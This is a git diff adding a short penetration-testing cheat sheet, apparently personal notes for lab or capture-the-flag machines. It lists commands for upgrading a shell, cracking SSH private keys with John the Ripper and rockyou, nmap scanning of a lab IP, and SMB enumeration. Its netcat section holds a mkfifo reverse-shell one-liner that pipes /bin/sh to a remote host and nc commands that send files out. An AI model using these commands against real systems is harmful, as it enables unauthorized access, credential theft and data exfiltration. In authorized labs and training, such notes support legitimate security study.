@@ -1,0 +1,40 @@
+-----Upgrade Dumb Shell-------
+> python -c 'import pty; pty.spawn("/bin/bash")'
+> background the shell with ctrl+z
+> echo $TERM
+> stty -a
+> stty raw -echo
+> fg
+> reset
+> xterm
+*****Other method*****
+> python
+> ctrl+z
+> stty raw -echo
+> fg
+> open other tab type stty size
+> stty rows ## cols ##
+> export TERM=xterm
+---------End-------------
+
+----Crack SSH keys-------
+> /usr/share/john/ssh2john.py id_rsa > hash
+> john --wordlist=/usr/share/wordlists/rockyou.txt hash
+---------End------------
+
+-----NMAP Port knock----
+>ports=$(nmap -p- --min-rate=1000 -T4 10.10.158.78 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+>nmap -p$ports -sC -sV -oA nmap.init "Host IP"
+---------End------------
+
+-----Netcat Tips--------
+>nc -v ip port (for internal shell)
+>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc hostip port >/tmp/f (for reverse shell upgrade)
+(transfer files via nc)
+>nc -lvnp port > outputfile
+>nc hostip port < /file/to/send
+-------End--------------
+
+-----SMB Enum----------
+>smbmap -H <TARGET IP>
+-------End------------
